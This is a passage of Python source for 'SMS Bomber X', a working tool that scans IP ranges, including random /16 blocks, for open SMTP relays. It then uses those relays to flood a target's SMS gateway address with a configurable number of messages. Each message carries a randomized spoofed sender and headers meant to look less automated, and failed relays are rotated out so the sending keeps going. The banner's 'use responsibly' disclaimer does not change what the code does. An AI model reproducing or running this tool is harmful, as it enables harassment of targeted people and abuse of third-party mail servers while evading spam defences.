        log.error("Cannot start bombing run: No active relays are available.")
        # Add a progress task to show bombing was skipped
        progress.add_task("[red]Bombing Skipped (No Relays)", total=1, completed=1)
        return

    # Pre-check: Load messages
    messages = load_messages(config.message_file)
    if not messages:
         log.error("Cannot start bombing run: No messages loaded (check file or defaults).")
         progress.add_task("[red]Bombing Skipped (No Messages)", total=1, completed=1)
         return

    # --- Setup Progress Bar Task for Bombing ---
    task_bomb_id = progress.add_task("[magenta]Sending Messages", total=config.message_count, start=True)
    sent_count = 0
    failure_this_message = 0 # Count failures for the *current* message index
    
    # Abort if too many failures occur *without managing to send a single message* via any relay
    max_total_failures_before_abort = len(relay_manager.active_relays) * 3 # Example threshold

    log.info(f"Starting bombing run: Target={config.target_email}, Count={config.message_count}, Delay=({config.delay_min:.1f}-{config.delay_max:.1f}s)")
    log.info(f"Utilizing relay pool with {len(relay_manager.active_relays)} active servers.")
    
    try:
        # Loop for the target number of messages to *send*
        # Using a while loop makes handling retries easier than modifying 'i' in a for loop
        current_message_index = 0
        total_failures = 0
        while sent_count < config.message_count:
        
            # Check if we've exhausted relays or hit total failure limit
            if not relay_manager.active_relays:
                log.error("Relay pool is now empty. Aborting bombing run.")
                break
            if total_failures >= max_total_failures_before_abort:
                 log.critical(f"Exceeded maximum total failure threshold ({max_total_failures_before_abort}). Aborting bombing run.")
                 break

            # Get the next relay from the pool (round-robin)
            current_relay = relay_manager.get_next_active_relay()
            
            # If get_next_active_relay returns None, all relays might have failed recently
            if not current_relay or not current_relay.connection:
                log.warning("Could not retrieve a working relay connection from the pool. Waiting briefly...")
                time.sleep(1.0) # Wait a moment before trying the loop again
                total_failures += 1 # Increment total failure count
                failure_this_message += 1
                continue # Try the loop again (maybe a relay comes back or check aborts)

            host_port = f"{current_relay.host}:{current_relay.port}"
            log.debug(f"Attempting message {sent_count + 1}/{config.message_count} via relay {host_port}")
            
            # Update progress bar description
            progress.update(task_bomb_id, description=f"[magenta]Sending ({sent_count+1}/{config.message_count}) via {host_port}")

            # --- Prepare the email message ---
            try:
                 # Generate unique details for each message attempt
                 from_local = random_string(random.randint(6, 12))
                 from_domain_chars = string.ascii_lowercase + string.digits
                 from_domain = f"{''.join(random.choice(from_domain_chars) for _ in range(random.randint(4, 8)))}.{random.choice(['com', 'net', 'org', 'info', 'biz'])}"
                 from_email = f"{from_local}@{from_domain}"
                 
                 message_body = random.choice(messages) # Select a random message
                 
                 msg = MIMEMultipart('alternative')
                 msg['From'] = from_email
                 msg['To'] = config.target_email
                 # Use slightly varied subjects
                 subject_prefix = random.choice(["Notification", "Alert", "Update", "Info", "Status", "Ref"])
                 msg['Subject'] = f"{subject_prefix}: {random_string(random.randint(8, 15))}" 
                 msg['Date'] = smtplib.email.utils.formatdate(localtime=True)
                 msg['Message-ID'] = smtplib.make_msgid(domain=from_domain) 
                 msg['X-Priority'] = str(random.randint(3, 5)) # Low to normal priority
                 # Optionally add other headers to look less automated
                 msg['User-Agent'] = f"Agent/{random.uniform(1.0, 5.0):.1f}" 
                 
                 msg.attach(MIMEText(message_body, 'plain', 'utf-8')) # Ensure UTF-8 encoding
                 
                 message_string = msg.as_string()
                 
            except Exception as prep_err:
                  log.error(f"Failed to prepare message {sent_count + 1}: {prep_err}. Skipping message.", exc_info=True)
                  total_failures += 1
                  failure_this_message += 1 
                  continue # Skip to next attempt

            # --- Attempt to send the email ---
            try:
                log.debug(f"Executing sendmail for message {sent_count + 1} via {host_port}")
                # Send the email using the current relay's connection object
                current_relay.connection.sendmail(from_email, [config.target_email], message_string) 
                
                # --- Success ---
                log.info(f"Message {sent_count + 1}/{config.message_count} sent successfully via {host_port}")
                sent_count += 1
                failure_this_message = 0 # Reset failure count for this message index
                total_failures = 0 # Reset total consecutive failures on any success
                progress.update(task_bomb_id, advance=1, description=f"[magenta]Sent ({sent_count}/{config.message_count})") # Update progress after success
                
                # --- Apply Dynamic Delay ---
                if sent_count < config.message_count: # No delay after the last message
                    delay = random.uniform(config.delay_min, config.delay_max)
                    log.debug(f"Waiting for {delay:.2f} seconds...")
                    progress.update(task_bomb_id, description=f"[magenta]Waiting {delay:.1f}s... ({sent_count}/{config.message_count} Sent)")
                    # Use time.sleep for the delay
                    time.sleep(delay) 

            # --- Handle Specific SMTP Errors during Send ---
            except (smtplib.SMTPServerDisconnected, smtplib.SMTPResponseException, smtplib.SMTPConnectError, socket.error) as relay_err:
                log.warning(f"Relay {host_port} connection failed during send: {relay_err}. Marking relay as failed.")
                relay_manager.mark_relay_failed(current_relay, reason=f"send_fail_{type(relay_err).__name__}")
                failure_this_message += 1
                total_failures += 1
                # Do *not* advance sent_count, retry message with the next relay in the next loop iteration
                progress.update(task_bomb_id, description=f"[yellow]Relay {host_port} failed. Retrying message {sent_count + 1}...") 
                # Loop continues to try next relay
                
            except smtplib.SMTPRecipientsRefused as e:
                 # This usually means the target address is invalid or blocked by the *current* relay
                 log.error(f"Recipient {config.target_email} REFUSED by relay {host_port}. Error: {e}. Aborting run.")
                 # Mark this relay as potentially problematic for this recipient, but the issue might be the target itself
                 relay_manager.mark_relay_failed(current_relay, reason="recipient_refused") 
                 failure_this_message += 1
                 total_failures += 1
                 progress.update(task_bomb_id, description=f"[bold red]Recipient Refused by {host_port}. ABORTING.")
                 break # Stop the entire bombing run - target address likely unusable

            except smtplib.SMTPSenderRefused as e:
                 log.warning(f"Sender '{from_email}' refused by {host_port}. Error: {e}. Marking relay failed & retrying message.")
                 relay_manager.mark_relay_failed(current_relay, reason="sender_refused")
                 failure_this_message += 1
                 total_failures += 1
                 progress.update(task_bomb_id, description=f"[yellow]Sender Refused by {host_port}. Retrying message {sent_count + 1}...")
                 # Loop continues to try next relay

            except smtplib.SMTPDataError as e:
                 log.warning(f"SMTP 'DATA' command error sending via {host_port}. Error: {e}. Marking relay failed & retrying message.")
                 relay_manager.mark_relay_failed(current_relay, reason="data_error")
                 failure_this_message += 1
                 total_failures += 1
                 progress.update(task_bomb_id, description=f"[yellow]DATA Error via {host_port}. Retrying message {sent_count + 1}...")
                 # Loop continues to try next relay
                 
            except Exception as e:
                 log.critical(f"Unexpected error during send attempt via {host_port}: {e}", exc_info=True)
                 # Potentially mark the relay as failed due to an unknown issue
                 relay_manager.mark_relay_failed(current_relay, reason="unexpected_send_error")
                 failure_this_message += 1
                 total_failures += 1
                 progress.update(task_bomb_id, description=f"[red]Unexpected Error via {host_port}. Retrying msg {sent_count + 1}...")
                 # Decide if fatal enough to stop the run? For now, let it retry.
                 # if IsFatal(e): break
            
            # Safety break: If we fail too many times for the *same message* index across different relays
            if failure_this_message >= (len(relay_manager.active_relays) + 2): # Allow trying all relays plus a couple retries
                 log.error(f"Failed to send message {sent_count + 1} after {failure_this_message} attempts across available relays. Skipping message.")
                 # Skip this message index and move to the next
                 failure_this_message = 0 # Reset counter for the next message
                 # Manually advance progress to indicate skipping, but don't count as sent
                 progress.update(task_bomb_id, advance=0, description=f"[red]Skipped message {sent_count+1}. Moving on...") 
                 sent_count += 1 # Increment sent_count to move the while loop condition forward eventually
                 time.sleep(1.0) # Small pause before trying next message index


    except KeyboardInterrupt:
        log.warning("Bombing run interrupted by user (KeyboardInterrupt).")
        progress.stop() # Stop progress display
        raise # Re-raise interrupt for main loop handling

    except Exception as e:
        # Catch unexpected errors in the bombing loop itself
        log.critical(f"Critical error during bombing execution: {e}", exc_info=True)
        progress.stop() # Ensure progress stops

    finally:
        log.debug("Bombing execution block finished.")
        # Ensure progress task is updated correctly on finish/interrupt/error
        # Check if the task object still exists (it might be removed if progress stopped abruptly)
        final_sent = sent_count # Use the actual count achieved
        try:
            if not progress.tasks[task_bomb_id].finished:
                final_desc = f"[magenta]Bombing Finished ({final_sent}/{config.message_count} Sent)"
                progress.update(task_bomb_id, completed=config.message_count, description=final_desc) # Mark as fully complete visually
        except IndexError:
              log.debug("Bombing progress task already removed.") # Task likely removed on stop/error
              
        log.info(f"Bombing run complete. Successfully sent: {final_sent}/{config.message_count}.")


# --- Profile Management ---
def list_profiles() -> List[str]:
    """Returns a list of available profile names (without .json extension)."""
    try:
        if PROFILES_DIR.is_dir():
            return sorted([f.stem for f in PROFILES_DIR.glob("*.json") if f.is_file()])
        else:
             return []
    except OSError as e:
         log.error(f"Error accessing profiles directory {PROFILES_DIR}: {e}")
         return []

def load_profile(profile_name: str) -> Optional[AppConfig]:
    """Loads an AppConfig from a specified profile file."""
    if not profile_name: return None
    profile_path = PROFILES_DIR / f"{profile_name}.json"
    if profile_path.is_file():
        try:
            log.debug(f"Loading profile from: {profile_path}")
            with open(profile_path, 'r', encoding='utf-8') as f:
                config_dict = json.load(f)
            
            # Create default config and update with loaded values
            config = AppConfig() 
            loaded_keys = 0
            for key, value in config_dict.items():
                if hasattr(config, key):
                    # Basic type validation/conversion could be added here if needed
                    try:
                        expected_type = AppConfig.__annotations__.get(key)
                        # Attempt conversion if types differ (e.g., float might be saved as int)
                        # This is basic, more complex types would need more handling
                        if expected_type == float and isinstance(value, int):
                           value = float(value)
                        elif expected_type == int and isinstance(value, float):
                             value = int(value) # Be cautious with float->int conversion
                             
                        setattr(config, key, value)
                        loaded_keys += 1
                    except TypeError as e:
                         log.warning(f"Type mismatch for key '{key}' in profile '{profile_name}'. Using default. Error: {e}")
                else:
                    log.warning(f"Ignoring unknown key '{key}' found in profile '{profile_name}'.")
            
            # Ensure profile name itself is set correctly in the loaded config
            config.profile_name = profile_name 
            log.info(f"Successfully loaded {loaded_keys} settings from profile '{profile_name}'.")
            return config
            
        except (json.JSONDecodeError, IOError, TypeError) as e:
            log.error(f"Failed to load or parse profile '{profile_name}': {e}")
            return None
        except Exception as e:
             log.error(f"Unexpected error loading profile '{profile_name}': {e}", exc_info=True)
             return None
    else:
        log.warning(f"Profile file not found: '{profile_path}'")
        return None

def save_profile(config: AppConfig):
    """Saves the current AppConfig to a profile file."""
    
    # Validate profile name before attempting to save
    profile_name_regex = r"^[a-zA-Z0-9_\-. ]+$" # Allow spaces, dots, hyphen, underscore
    profile_name_to_save = config.profile_name.strip()
    
    if not profile_name_to_save or not re.match(profile_name_regex, profile_name_to_save):
        log.error(f"Invalid profile name '{config.profile_name}'. Please use letters, numbers, spaces, dots, underscores, or hyphens.")
        # Ask for a valid name interactively
        new_name = Prompt.ask("[yellow]Enter a valid profile name:", default="default_profile")
        new_name = new_name.strip()
        if not new_name or not re.match(profile_name_regex, new_name):
             log.error("Still invalid profile name. Aborting save.")
             return False # Indicate save failure
        config.profile_name = new_name # Update the config object with the valid name
        profile_name_to_save = new_name # Use the validated name
        
    profile_path = PROFILES_DIR / f"{profile_name_to_save}.json"
    log.debug(f"Saving profile to: {profile_path}")
    
    try:
        # Convert the dataclass object to a dictionary for JSON serialization
        # Use vars() or dataclasses.asdict()
        config_dict = config.__dict__ 
        
        # Ensure the profiles directory exists
        profile_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Write the dictionary to the JSON file
        with open(profile_path, 'w', encoding='utf-8') as f:
            json.dump(config_dict, f, indent=2, ensure_ascii=False) # Use indent for readability
            
        log.info(f"Configuration saved successfully as profile '{profile_name_to_save}'.")
        return True # Indicate success
        
    except (IOError, TypeError, OSError) as e:
        log.error(f"Failed to save profile '{profile_name_to_save}': {e}")
        return False # Indicate failure
    except Exception as e:
         log.error(f"Unexpected error saving profile '{profile_name_to_save}': {e}", exc_info=True)
         return False # Indicate failure

def get_user_config_interactive() -> Optional[AppConfig]:
    """Interactively gathers configuration settings from the user."""
    
    # Start with a default configuration object
    config = AppConfig() 
    
    console.print(Panel("SMS Bomber X Configuration", title="[bold cyan]Setup", style="cyan", border_style="cyan"))
    
    # --- Offer to Load Existing Profile ---
    available_profiles = list_profiles()
    if available_profiles:
        profile_choices = ["[none]"] + available_profiles
        load_choice = Prompt.ask(
            f"Load an existing profile or create new configuration?", 
            choices=profile_choices, 
            default="[none]"
        )
        if load_choice != "[none]":
            loaded_config = load_profile(load_choice)
            if loaded_config:
                # Confirm if user wants to use the loaded config or modify it
                if Confirm.ask(f"Use loaded profile '{load_choice}' settings?", default=True):
                     return loaded_config # Return the successfully loaded config
                else:
                     config = loaded_config # Start modification from loaded config
                     console.print("[yellow]Modifying loaded profile settings.[/]")
            else:
                 console.print(f"[red]Failed to load profile '{load_choice}'. Continuing with manual configuration.[/]")
                 # Fall through to manual configuration starting with defaults
    else:
         console.print("[i blue]No existing profiles found. Starting new configuration.[/i]")

    # --- Gather Configuration Details Interactively ---
    console.print(Panel("Target & Message Settings", style="magenta"))

    # Target Email
    while True:
         current_target = f" (current: [green]{config.target_email}[/])" if config.target_email else ""
         target_input = Prompt.ask(f"Enter target SMS gateway address{current_target}", default=config.target_email)
         if validate_email(target_input):
             config.target_email = target_input
             break
         else:
             console.print("[red]Invalid email address format. Please try again.[/]")

    # Message Count
    config.message_count = IntPrompt.ask("Number of messages to send", default=config.message_count)
    
    # Dynamic Delay - use FloatPrompt
    config.delay_min = FloatPrompt.ask("Minimum delay between messages (seconds, e.g., 1.5)", default=config.delay_min)
    config.delay_max = FloatPrompt.ask("Maximum delay between messages (seconds, e.g., 5.0)", default=config.delay_max)
    # Ensure min <= max
    if config.delay_min < 0: config.delay_min = 0.0 # Ensure non-negative delay
    if config.delay_max < config.delay_min:
        console.print(f"[yellow]Warning: Maximum delay ({config.delay_max}s) is less than minimum ({config.delay_min}s). Setting max = min + 1.0s.[/]")
        config.delay_max = config.delay_min + 1.0

    # Custom Message File
    current_msg_file = f" (current: [green]{config.message_file}[/])" if config.message_file else " (current: use defaults)"
    use_custom = Confirm.ask(f"Use a custom message file?{current_msg_file}", default=bool(config.message_file))
    if use_custom:
         # Provide default based on current config if available
         default_path = config.message_file if config.message_file else "messages.txt"
         file_input = Prompt.ask("Enter path to message file", default=default_path)
         message_path = Path(file_input)
         # Check if the file exists *now* to provide immediate feedback
         if not message_path.is_file():
             console.print(f"[yellow]Warning:[/yellow] File '{message_path}' doesn't currently exist.")
             # Optional: Ask if they want to proceed anyway or re-enter
             # if not Confirm.ask("Continue anyway (file might be created later)?", default=True): continue # Re-prompt file path if needed
         config.message_file = str(message_path) # Store as string
    else:
        config.message_file = None # Explicitly set to None if not using custom

    # --- Scanner Settings ---
    console.print(Panel("Relay Scanner Settings", style="blue"))

    ports_input = Prompt.ask("Enter SMTP ports to scan (comma-separated)", default=",".join(map(str, config.scan_ports)))
    config.scan_ports = parse_ports(ports_input)

    current_range = f" (current: [green]{config.scan_range_raw}[/])" if config.scan_range_raw else " (current: use random /16)"
    config.scan_range_raw = Prompt.ask(f"Enter scan target (hostname, IP, CIDR, or blank for random){current_range}", default=config.scan_range_raw)
    
    config.scan_timeout = IntPrompt.ask("Connection timeout per relay (seconds)", default=config.scan_timeout)
    if config.scan_timeout < 1: config.scan_timeout = 1 # Min timeout 1 second

    config.scan_workers = IntPrompt.ask("Max concurrent scan workers", default=config.scan_workers)
    if config.scan_workers < 1: config.scan_workers = 1 # Min 1 worker

    config.relay_pool_target = IntPrompt.ask("Stop scan after finding this many working relays (0 = find all)", default=config.relay_pool_target)
    if config.relay_pool_target < 0: config.relay_pool_target = 0 # Allow 0 for unlimited

    # --- Cache and Log Settings ---
    console.print(Panel("Cache & Log Settings", style="yellow"))
    config.use_relay_cache = Confirm.ask("Use relay cache file for prioritizing scans?", default=config.use_relay_cache)
    # Reference the legacy log file explicitly if found
    old_log_display = " (found legacy 'open_smtp_servers.log')" if Path("open_smtp_servers.log").exists() else ""
    config.load_previous_log = Confirm.ask(f"Prioritize relays from 'open_smtp_servers.log'?{old_log_display}", default=config.load_previous_log)
    
    # --- Save Configuration as Profile ---
    console.print(Panel("Save Configuration", style="green"))
    save_choice = Confirm.ask("Save this configuration as a profile?", default=False)
    if save_choice:
        profile_name_prompt = Prompt.ask("Enter profile name", default=config.profile_name)
        config.profile_name = profile_name_prompt.strip() # Use the entered name
        if not save_profile(config): # Attempt save, check for failure
             console.print("[red]Failed to save profile.[/red] Continuing without saving.")
             # Optionally retry asking for name or just proceed
    else:
        log.info("Configuration not saved as a profile for this run.")

    return config

# --- Main Application Logic ---
def display_banner():
    """Prints the application banner and informational panel."""
    # Raw string for banner to preserve backslashes
    banner = r"""[bold cyan]
# __________                  __             __     ________             .___ 
# \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
#  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
#  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
#  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
#         \/              \/      \/     \/               \/              \/  
[/]
[bold blue] SMS Bomber X - Enhanced Edition [/]
[i yellow] Disclaimer: Use responsibly, ethically, and only with explicit permission. [/]"""
    console.print(Panel.fit(banner, border_style="blue")) # Use Panel.fit for better wrapping
    
    info_text = (
        f"Log File : [dim cyan]{LOG_FILE.resolve()}[/]\n"
        f"Profiles : [dim cyan]{PROFILES_DIR.resolve()}[/]\n"
        f"Cache File: [dim cyan]{RELAY_CACHE_FILE.resolve()}[/]"
    )
    console.print(Panel(info_text, title="[bold]Paths[/]", style="dim", border_style="yellow", expand=False))


def main_app():
    """Main function to run the SMS Bomber X application."""
    display_banner() # Show banner first
    
    # --- Global Progress Bar Setup ---
    # Configure columns for the progress display
    progress = Progress(
        TextColumn("[progress.description]{task.description}", justify="left"),
        BarColumn(bar_width=None), # Allow bar to expand
        TextColumn("[progress.percentage]{task.percentage:>3.1f}%"),
        SpinnerColumn(spinner_name="dots", style="cyan"), # Or choose another spinner
        TimeRemainingColumn(),
        TextColumn("•"),
        TimeElapsedColumn(),
        console=console,
        transient=False, # Keep completed tasks visible
        expand=True # Allow progress to take available width
    )

    config: Optional[AppConfig] = None
    relay_manager: Optional[RelayManager] = None # Initialize later
    previous_log_relays: List[str] = [] # Store entries from legacy log

    # --- Load legacy log file early ---
    # This file is simple, no complex parsing needed here
    old_log_path = Path("open_smtp_servers.log")
    if old_log_path.is_file():
        try:
            with open(old_log_path, 'r', encoding='utf-8') as f:
                # Basic filtering for potential ip:port format
                previous_log_relays = [line.strip() for line in f if line.strip() and ':' in line]
            if previous_log_relays:
                log.info(f"Found {len(previous_log_relays)} potential relay entries in legacy 'open_smtp_servers.log'.")
            else:
                 log.info("Legacy 'open_smtp_servers.log' found but was empty or contained no valid entries.")
        except Exception as e:
             log.warning(f"Could not read legacy log file '{old_log_path}': {e}")

    try:
        # --- Initialize Relay Manager ---
        # Do this before config to potentially load cache data for display/use in config phase
        relay_manager = RelayManager(RELAY_CACHE_FILE, console)
        
        # --- Get Configuration from User ---
        config = get_user_config_interactive()
        if not config: # If user somehow aborted config (e.g., failed profile load and didn't continue)
             console.print("[bold red]Configuration process failed or was cancelled. Exiting.[/]")
             return # Exit if config setup doesn't complete

        # --- Main Execution Flow with Live Progress Display ---
        console.print("\n", Panel("[bold green]Starting Operations[/]", expand=False, style="green"))
        with Live(progress, refresh_per_second=10, console=console, vertical_overflow="visible", transient=False) as live:
            # Allow live display to fully render before proceeding if needed
            # time.sleep(0.1) 

            # --- Step 1: Scan for SMTP Relays ---
            live.update(progress) # Update display
            run_scan(config, relay_manager, previous_log_relays if config.load_previous_log else [], progress)
            live.update(progress) # Update after scan finishes

            # --- Step 2: Run the Bombing Process (if relays found & confirmed) ---
            if relay_manager.active_relays:
                live.update(progress) # Ensure latest progress shown before prompt
                console.print("\n") # Add space before confirmation
                start_bombing = Confirm.ask(
                    f"[bold green]Scan complete. Found {len(relay_manager.active_relays)} working relays. Proceed with bombing run?[/]", 
                    default=True
                )
                if start_bombing:
                    run_bombing(config, relay_manager, progress)
                else:
                    console.print("[yellow]Bombing run cancelled by user confirmation.[/]")
                    # Add a dummy progress task to show cancellation
                    progress.add_task("[yellow]Bombing Cancelled", total=1, completed=1)
            else:
                 # Displayed if scan ran but found nothing usable
                 console.print("\n[bold red]Scan finished, but no working relays are currently available.[/]")
                 progress.add_task("[red]Bombing Skipped (No Active Relays)", total=1, completed=1)

            # Keep the final progress display visible for a moment
            live.update(progress)
            # time.sleep(1) # Optional short pause

    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        console.print("\n[bold yellow]Operation interrupted by user (Ctrl+C).[/]")
        log.warning("Operation manually interrupted.")
    except Exception as e:
        # Catch any other unexpected exceptions in the main flow
        console.print("\n[bold red]An unexpected critical error occurred during execution![/]")
        log.critical("Critical error in main application loop:", exc_info=True)
        # Display the traceback on the console for easier debugging
        console.print_exception(show_locals=True, width=console.width) 
    finally:
        # --- Cleanup ---
        console.print("\n[bold cyan]Initiating shutdown procedure...[/]")
        # Ensure relay connections are closed and cache is saved
        if relay_manager:
            try:
                 relay_manager.close_all_connections()
            except Exception as close_err:
                  log.error(f"Error during connection cleanup: {close_err}", exc_info=True)
            try:
                 relay_manager.save_cache() 
            except Exception as save_err:
                  log.error(f"Error during final cache save: {save_err}", exc_info=True)
        else:
             log.debug("Relay Manager was not initialized, skipping cleanup.")
             
        # Final exit message
        console.print(Panel("[bold magenta]Exited SMS Bomber X.[/]", style="magenta", border_style="magenta"))


# --- Entry Point ---
if __name__ == "__main__":
    # This block runs when the script is executed directly
    main_app() 
